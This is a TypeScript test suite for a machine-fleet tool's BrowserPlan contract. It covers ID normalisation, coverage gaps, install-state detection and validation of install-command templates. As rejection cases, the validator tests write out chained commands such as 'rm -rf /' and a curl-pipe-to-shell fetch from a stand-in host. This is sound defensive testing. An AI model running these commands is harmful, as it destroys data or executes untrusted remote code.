import { afterEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { closeDb } from "../src/db.js";
import { manifestAdd, manifestInit } from "../src/commands/manifest.js";
import {
  BROWSERPLAN_APP_ID,
  BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX,
  BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE,
  BROWSERPLAN_LEGACY_INSTALL_UPDATE_COMMAND_TEMPLATE,
  BROWSERPLAN_PACKAGE_NAME,
  BROWSERPLAN_PINNED_VERSION,
  BROWSERPLAN_ROUTE_OWNER,
  getBrowserPlanFleet,
  normalizeBrowserPlanMachineId,
  type BrowserPlanFleet,
} from "../src/browserplan.js";
import { validateMachinesConsumerEnvelope } from "../src/consumer-schema.js";
import { defaultAppIdForPackage } from "../src/distribution.js";
import { MACHINES_PACKAGE_NAME, discoverMachineTopology } from "../src/topology.js";
import type { CompatibilityCommandRunner } from "../src/compatibility.js";

const ENV_KEYS = [
  "HASNA_MACHINES_DB_PATH",
  "HASNA_MACHINES_MANIFEST_PATH",
  "HASNA_MACHINES_MACHINE_ID",
  "HASNA_MACHINES_REACHABLE_HOSTS",
] as const;

afterEach(() => {
  closeDb();
  for (const key of ENV_KEYS) delete process.env[key];
});

function setupTemp(name: string): string {
  const dir = mkdtempSync(join(tmpdir(), name));
  process.env.HASNA_MACHINES_DB_PATH = join(dir, "machines.db");
  process.env.HASNA_MACHINES_MANIFEST_PATH = join(dir, "machines.json");
  process.env.HASNA_MACHINES_MACHINE_ID = "machine001";
  manifestInit();
  return dir;
}

function addBrowserPlanFixtureMachines(): void {
  process.env.HASNA_MACHINES_REACHABLE_HOSTS = "operator@machine001,operator@machine002";
  manifestAdd({
    id: "machine001",
    friendlyName: "Browser One",
    platform: "macos",
    workspacePath: "/Users/hasna/Workspace",
    sshAddress: "operator@machine001",
    tags: ["browserplan", "mail"],
    updatedAt: "2026-06-23T08:00:00.000Z",
    metadata: {
      workspace_paths: { "open-chrome": "/Users/hasna/Workspace/open-chrome" },
      open_files_roots: { "open-chrome": "/Users/hasna/Workspace/open-files" },
      authenticated: true,
    },
  });
  manifestAdd({
    id: "machine002",
    platform: "linux",
    workspacePath: "/home/hasna/Workspace",
    sshAddress: "operator@machine002",
    updatedAt: "2026-06-23T07:00:00.000Z",
  });
  manifestAdd({
    id: "spark01",
    platform: "linux",
    workspacePath: "/home/hasna/Workspace",
    sshAddress: "operator@spark01",
    updatedAt: "2026-06-23T06:00:00.000Z",
  });
}

function installRunner(overrides: Record<string, Set<string>> = {}): CompatibilityCommandRunner {
  return (machineId, command) => {
    const commandName = command.match(/cmd='([^']+)'/)?.[1] ?? "";
    const missing = overrides[machineId]?.has(commandName) === true;
    if (commandName) {
      return {
        machineId,
        source: "ssh",
        stdout: missing ? "path=\n" : `path=/usr/bin/${commandName}\nversion=${commandName} 1.2.3\n`,
        stderr: "",
        exitCode: 0,
      };
    }
    return { machineId, source: "ssh", stdout: "", stderr: "", exitCode: 0 };
  };
}

describe("BrowserPlan fleet contract", () => {
  test("derives owner ids from the npm package names rather than repeating literals", () => {
    expect(BROWSERPLAN_APP_ID).toBe(defaultAppIdForPackage(BROWSERPLAN_PACKAGE_NAME));
    expect(BROWSERPLAN_ROUTE_OWNER).toBe(defaultAppIdForPackage(MACHINES_PACKAGE_NAME));
  });

  test("installs and updates BrowserPlan from npm, never from a git checkout", () => {
    // Asserted against a hardcoded literal on purpose. Rebuilding the expected string from
    // the same constants the value is built from is a tautology: it would still pass if
    // BROWSERPLAN_PACKAGE_NAME were changed to a package that does not exist.
    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE).toBe("bun install -g @hasna/open-chrome@0.1.0");
    expect(BROWSERPLAN_PACKAGE_NAME).toBe("@hasna/open-chrome");
    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX).toBe("bun install -g @hasna/open-chrome@");
    // No placeholder: nothing in this package can resolve a version for the target package.
    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE).not.toContain("<");
    // The emitted version must stay PINNED. Once the source repo is retired, npm is the
    // sole artifact and nobody is watching the name, so a floating dist-tag would let a
    // moved tag push arbitrary code to the fleet via `bun install -g`.
    expect(BROWSERPLAN_PINNED_VERSION).toBe("0.1.0");
    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE).not.toMatch(/@(latest|next|beta|canary|\*)$/);
    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE).toMatch(/@\d+\.\d+\.\d+$/);
  });

  test("app_install_update validation is an allowlist of install shapes, not a git denylist", () => {
    const dir = setupTemp("machines-browserplan-allowlist-");
    try {
      addBrowserPlanFixtureMachines();
      const fleet = getBrowserPlanFleet({
        machineIds: ["machine001"],
        topology: discoverMachineTopology({ includeTailscale: false, limit: null }),
        now: new Date("2026-06-23T09:00:00.000Z"),
      });
      const withTemplate = (template: string) => {
        const clone = structuredClone(fleet) as unknown as BrowserPlanFleet;
        const hook = clone.machines[0]?.operation_hooks.find((entry) => entry.id === "app_install_update");
        if (hook) hook.command_template = template;
        return validateMachinesConsumerEnvelope("browserplan_fleet", clone).ok;
      };

      // Accepted: the emitted dist-tag form, and a caller pinning a concrete version.
      expect(withTemplate("bun install -g @hasna/open-chrome@latest")).toBe(true);
      expect(withTemplate("bun install -g @hasna/open-chrome@0.1.0")).toBe(true);
      // Accepted for backward compatibility: a payload cached from <= 0.2.2.
      expect(withTemplate(BROWSERPLAN_LEGACY_INSTALL_UPDATE_COMMAND_TEMPLATE)).toBe(true);
      // Rejected: git-based rewrites that a "git pull" phrase denylist would have missed.
      expect(withTemplate("cd /tmp/open-chrome && git fetch origin && git reset --hard origin/main")).toBe(false);
      expect(withTemplate("git -C /tmp/open-chrome pull --ff-only origin main")).toBe(false);
      expect(withTemplate("git clone https://example.invalid/chrome.git /tmp/open-chrome")).toBe(false);
      // Rejected: installing some other package under the BrowserPlan hook.
      expect(withTemplate("bun install -g @hasna/machines@latest")).toBe(false);
      // Rejected: anything CHAINED AFTER an otherwise-valid install. A prefix-only check
      // accepts all of these, so without them the suite cannot tell the vulnerable
      // implementation from the end-anchored one.
      expect(withTemplate("bun install -g @hasna/open-chrome@latest && rm -rf /")).toBe(false);
      expect(withTemplate("bun install -g @hasna/open-chrome@latest; curl http://example.invalid/x.sh | sh")).toBe(false);
      expect(withTemplate("bun install -g @hasna/open-chrome@latest; cd /tmp/x && git pull")).toBe(false);
      expect(withTemplate("bun install -g @hasna/open-chrome@latest --cwd /tmp/x")).toBe(false);
      // Rejected: an empty version, which would resolve to whatever npm defaults to.
      expect(withTemplate("bun install -g @hasna/open-chrome@")).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("normalizes only BrowserPlan machine ids and excludes spark ids", () => {
    expect(normalizeBrowserPlanMachineId("machine001")).toBe("machine001");
    expect(normalizeBrowserPlanMachineId("Machine2")).toBe("machine002");
    expect(normalizeBrowserPlanMachineId("machine011")).toBe("machine011");
    expect(normalizeBrowserPlanMachineId("machine012")).toBeNull();
    expect(normalizeBrowserPlanMachineId("spark01")).toBeNull();
    expect(normalizeBrowserPlanMachineId("spark02")).toBeNull();
  });

  test("lists machine001-machine011 coverage without mixing spark machines", () => {
    const dir = setupTemp("machines-browserplan-");
    try {
      addBrowserPlanFixtureMachines();
      const topology = discoverMachineTopology({ includeTailscale: false, limit: null });
      const fleet = getBrowserPlanFleet({
        machineIds: ["machine001", "machine2", "spark01", "machine999"],
        topology,
        now: new Date("2026-06-23T09:00:00.000Z"),
      });

      expect(fleet).toMatchObject({
        kind: "browserplan_fleet",
        target: {
          name: "browserplan-machine001-machine011",
          owner: "open-chrome",
          install_target_excludes: ["spark01", "spark02"],
        },
        coverage: {
          expected: 2,
          returned: 2,
          known: 2,
          missing: [],
          excluded_requested: ["spark01"],
        },
      });
      expect(fleet.target.machine_ids).toHaveLength(11);
      expect(fleet.target.machine_ids).toContain("machine011");
      expect(fleet.machines.map((machine) => machine.machine_id)).toEqual(["machine001", "machine002"]);
      expect(fleet.machines.map((machine) => machine.machine_id)).not.toContain("spark01");
      expect(fleet.warnings).toContain("browserplan_machine_excluded:spark01");
      expect(fleet.warnings).toContain("browserplan_machine_unsupported:machine999");
      expect(fleet.machines[0]?.display_name).toBe("Browser One");
      expect(fleet.machines[0]?.workspace.project_root).toBe("/Users/hasna/Workspace/open-chrome");
      expect(fleet.machines[0]?.install_state.checked).toBe(false);
      expect(fleet.machines[0]?.operation_hooks.map((hook) => hook.id)).toEqual([
        "profile_setup",
        "headed_launch",
        "headless_launch",
        "daemon_status",
        "supervisor_status",
        "tab_inventory",
        "session_inventory",
        "app_install_update",
      ]);
      expect(fleet.machines[0]?.operation_hooks.every((hook) => hook.safe_runner.mcp.args.private_metadata === false)).toBe(true);
      expect(fleet.machines[0]?.operation_hooks.find((hook) => hook.id === "supervisor_status")?.command_template).toBe("browserplan remote status --machine <machine-id> --json");
      const installHook = fleet.machines[0]?.operation_hooks.find((hook) => hook.id === "app_install_update");
      expect(installHook?.command_template).toBe("bun install -g @hasna/open-chrome@0.1.0");
      expect(installHook?.command_placeholders).toEqual([]);
      // git is no longer required: the hook installs from npm, so a machine without git
      // must not be reported as blocked for it.
      expect(installHook?.required_capabilities).toEqual(["bun"]);
      expect(validateMachinesConsumerEnvelope("browserplan_fleet", fleet)).toMatchObject({ ok: true, errors: [] });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("detects remote capabilities and blocks hooks when BrowserPlan is missing", () => {
    const dir = setupTemp("machines-browserplan-installs-");
    try {
      addBrowserPlanFixtureMachines();
      const topology = discoverMachineTopology({ includeTailscale: false, limit: null });
      const fleet = getBrowserPlanFleet({
        machineIds: ["machine001", "machine002"],
        topology,
        includeInstallState: true,
        runner: installRunner({ machine002: new Set(["browserplan"]) }),
        now: new Date("2026-06-23T09:00:00.000Z"),
      });

      const machine001 = fleet.machines.find((machine) => machine.machine_id === "machine001");
      const machine002 = fleet.machines.find((machine) => machine.machine_id === "machine002");
      expect(machine001?.install_state).toMatchObject({
        checked: true,
        browserplan_cli: { state: "available" },
        chrome: { state: "available" },
      });
      expect(machine001?.operation_hooks.find((hook) => hook.id === "headed_launch")).toMatchObject({
        readiness: "ready",
        available: true,
      });
      expect(machine002?.install_state.browserplan_cli.state).toBe("missing");
      expect(machine002?.operation_hooks.find((hook) => hook.id === "profile_setup")).toMatchObject({
        readiness: "blocked",
        available: false,
        blocked_by: ["browserplan_cli_missing"],
      });
      expect(validateMachinesConsumerEnvelope("browserplan_fleet", fleet)).toMatchObject({ ok: true, errors: [] });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("reports missing BrowserPlan target machines as coverage gaps", () => {
    const dir = setupTemp("machines-browserplan-missing-");
    try {
      const fleet = getBrowserPlanFleet({
        machineIds: ["machine011"],
        topology: discoverMachineTopology({ includeTailscale: false, limit: null }),
        now: new Date("2026-06-23T09:00:00.000Z"),
      });

      expect(fleet.coverage).toMatchObject({
        expected: 1,
        returned: 1,
        known: 0,
        missing: ["machine011"],
      });
      expect(fleet.machines[0]).toMatchObject({
        machine_id: "machine011",
        known: false,
        eligible: false,
        eligibility_reasons: ["machine_missing_from_open_machines_topology", "route_unavailable", "route_confidence_none"],
      });
      expect(fleet.machines[0]?.operation_hooks.every((hook) => hook.available === false)).toBe(true);
      expect(validateMachinesConsumerEnvelope("browserplan_fleet", fleet)).toMatchObject({ ok: true, errors: [] });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("rejects malformed BrowserPlan fleet contract payloads", () => {
    const dir = setupTemp("machines-browserplan-schema-");
    try {
      addBrowserPlanFixtureMachines();
      const fleet = getBrowserPlanFleet({
        machineIds: ["machine001"],
        topology: discoverMachineTopology({ includeTailscale: false, limit: null }),
        now: new Date("2026-06-23T09:00:00.000Z"),
      });
      const malformed = structuredClone(fleet) as any;
      malformed.target.machine_ids = ["spark01"];
      malformed.target.excluded_machine_ids = [];
      malformed.coverage.missing = ["spark01"];
      malformed.operation_contract.stable_surfaces.mcp = "wrong_tool";
      malformed.machines[0].operation_hooks[0].safe_runner.mcp.args.private_metadata = true;
      malformed.machines[0].operation_hooks.find((hook: { id: string }) => hook.id === "supervisor_status").command_template = "browserplan remote start --machine <machine-id> --json";
      // A template that is neither the npm install shape nor the exact legacy template must
      // fail. This variant is deliberately one a "git pull" phrase denylist would have let
      // through, so the assertion covers the allowlist rather than the old denylist.
      malformed.machines[0].operation_hooks.find((hook: { id: string }) => hook.id === "app_install_update").command_template = "cd <open-chrome-project-root> && git fetch origin && git reset --hard origin/main";

      const result = validateMachinesConsumerEnvelope("browserplan_fleet", malformed);
      expect(result.ok).toBe(false);
      expect(result.errors).toEqual(expect.arrayContaining([
        "target.machine_ids",
        "target.excluded_machine_ids",
        "coverage.missing.0",
        "operation_contract.stable_surfaces.mcp",
        "machines.0.operation_hooks.0.safe_runner.mcp.args.private_metadata",
        "machines.0.operation_hooks.4.command_template",
        "machines.0.operation_hooks.7.command_template",
      ]));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
